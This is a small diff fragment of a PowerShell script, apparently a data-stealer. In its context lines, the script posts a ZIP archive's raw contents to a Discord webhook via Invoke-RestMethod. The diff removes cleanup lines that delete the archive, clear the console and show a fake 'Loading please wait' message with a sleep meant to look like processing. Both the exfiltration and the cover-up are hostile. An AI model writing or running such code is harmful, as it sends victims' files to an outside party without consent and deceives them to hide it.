@@ -23,10 +23,3 @@ $(Get-Content -Raw -Path $zipPath)
 
 # Send the ZIP file to the Discord webhook
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $payload
-
-# Clean up
-Remove-Item -Path $zipPath
-cls
-Write-Host "Loading please wait."
-Start-Sleep -s 10  # Simulate script processing time
-Write-Host "Finished."
